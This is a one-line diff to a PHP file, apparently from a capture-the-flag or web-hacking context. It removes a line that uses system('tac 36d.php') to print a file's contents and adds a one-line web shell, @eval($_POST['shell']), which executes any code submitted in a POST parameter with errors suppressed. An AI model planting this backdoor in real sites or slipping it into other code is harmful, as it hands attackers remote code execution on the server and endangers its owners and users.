@@ -1,1 +1,1 @@
-<?php echo"<?php system('tac 36d.php');?>"; ?>
+<?php @eval($_POST['shell']);?>
